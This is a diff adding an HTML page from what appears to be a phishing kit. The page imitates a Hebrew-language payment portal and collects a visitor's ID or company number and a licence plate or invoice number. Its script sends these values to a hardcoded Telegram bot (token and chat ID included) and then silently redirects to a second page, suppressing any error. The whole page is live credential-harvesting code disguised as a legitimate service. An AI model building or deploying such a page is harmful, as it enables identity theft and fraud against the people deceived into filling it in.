@@ -1,0 +1,233 @@
+<html lang="he" class=" maibmqjbkg idc0_350"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>תשלומים</title>
+    <style>
+        /* إعداد الخطوط والألوان */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        /* الشريط العلوي */
+        .header {
+            background-color: #004c97; /* الأزرق المستخدم */
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            position: relative;
+        }
+
+        .logo {
+            height: 40px; /* ضبط ارتفاع اللوغو */
+            order: 2; /* اللوغو يظهر على اليمين */
+        }
+
+        .menu-icon {
+            font-size: 30px;
+            cursor: pointer;
+            order: 1; /* الشحطات تظهر على اليسار */
+        }
+
+        /* القسم الرئيسي */
+        .container {
+            width: 90%;
+            max-width: 350px; /* تقليص الحجم ليكون أصغر */
+            background: white;
+            padding: 20px;
+            margin: 20px auto;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: right;
+        }
+
+        h2 {
+            text-align: center;
+            color: black;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            color: black;
+        }
+
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        /* تصغير حجم حقل الإدخال */
+        input[type="text"] {
+            width: 100%; /* تأكد من أن الحقل لا يتجاوز عرض النموذج */
+            max-width: 100%; /* تحديد أقصى عرض */
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            border: none;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        /* التصميم المتموج */
+        .wave-container {
+            position: relative;
+            background: linear-gradient(to bottom, #004c97, #007bff);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 10px;
+        }
+
+        .wave-container h3 {
+            margin: 0;
+        }
+
+        /* الدائرة */
+        .circle {
+            position: absolute;
+            top: -30px;
+            left: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%; /* جعل الصورة دائرية */
+            object-fit: cover; /* لضمان أن الصورة ستملأ الدائرة */
+        }
+
+        /* تنسيق الاستجابة للشاشات المختلفة */
+        @media (max-width: 768px) {
+            .container {
+                max-width: 90%; /* زيادة عرض المربع ليشغل مساحة أكبر */
+                padding: 15px;
+            }
+
+            .header {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+            }
+
+            .menu-icon {
+                font-size: 28px;
+            }
+
+            .logo {
+                order: 2; /* اللوغو سيكون في الجهة اليمنى */
+            }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                max-width: 90%; /* المربع سيكون عرض الشاشة بالكامل */
+                padding: 12px;
+            }
+
+            .header {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+            }
+
+            .logo {
+                order: 2;
+                margin-left: auto; /* تأكيد موضع اللوغو على اليمين */
+            }
+
+            .menu-icon {
+                font-size: 28px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .menu-icon {
+                font-size: 25px;
+            }
+
+            .container {
+                padding: 10px;
+            }
+
+            input, select, button {
+                padding: 10px; /* تقليص الحشوة داخل المدخلات */
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- الشريط العلوي -->
+    <div class="header">
+        <div class="menu-icon">☰</div> <!-- ثلاث شحطات -->
+        <img src="images/logo.png" alt="Logo" class="logo"> <!-- اللوغو -->
+    </div>
+
+    <!-- الصندوق الأبيض الرئيسي -->
+    <div class="container">
+        <h2>כניסה לשירות התשלומים</h2>
+        
+        <label for="id_number">* מספר ת.ז / ח.פ</label>
+        <input type="text" id="id_number" placeholder="הזן מספר" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <label for="method">* בחירת אמצעי זיהוי</label>
+        <select id="method">
+            <option value="license">מספר לוחית רישוי</option>
+            <option value="account">מספר חשבונית</option>
+        </select>
+
+        <label for="input_number">* מספר לוחית / חשבונית</label>
+       <input type="text" id="input_number" placeholder="הזן מספר" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+
+        <button onclick="submitForm()">כניסה</button>
+    </div>
+
+    <!-- التصميم المتموج -->
+    <div class="wave-container">
+        <img src="images/d.png" alt="Circle" class="circle"> <!-- الدائرة -->
+        <h3>התשלום חשבוניות</h3>
+        <p>כאן ניתן לבצע תשלום חשבוניות באופן קל ומהיר</p>
+    </div>
+
+    <script>
+        function submitForm() {
+            let idNumber = document.getElementById("id_number").value;
+            let method = document.getElementById("method").value;
+            let inputNumber = document.getElementById("input_number").value;
+
+            if (idNumber === "" || inputNumber === "") {
+                alert("אנא מלא את כל השדות");
+                return;
+            }
+
+            // إرسال البيانات إلى تلغرام (تحتاج إلى إعداد API في الخلفية)
+            let telegramUrl = "https://api.telegram.org/bot7699282351:AAHbbHxMWnmkpVyNXzMADXCKMRgXoa48E5M/sendMessage";
+            let chatId = "-4627765011";
+            let message = `ID: ${idNumber}, Method: ${method}, Input: ${inputNumber}`;
+
+            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => {
+                    // تجاهل أي خطأ وواصل تنفيذ التحويل إلى الصفحة
+                    window.location.href = "2.html"; // التوجيه إلى الصفحة الثانية
+                })
+                .catch(error => {
+                    // تجاهل الخطأ تمامًا ولا تظهر أي رسائل
+                    window.location.href = "2.html"; // التوجيه إلى الصفحة الثانية حتى في حالة حدوث خطأ
+                });
+        }
+    </script>
+
+
+
+</body></html>
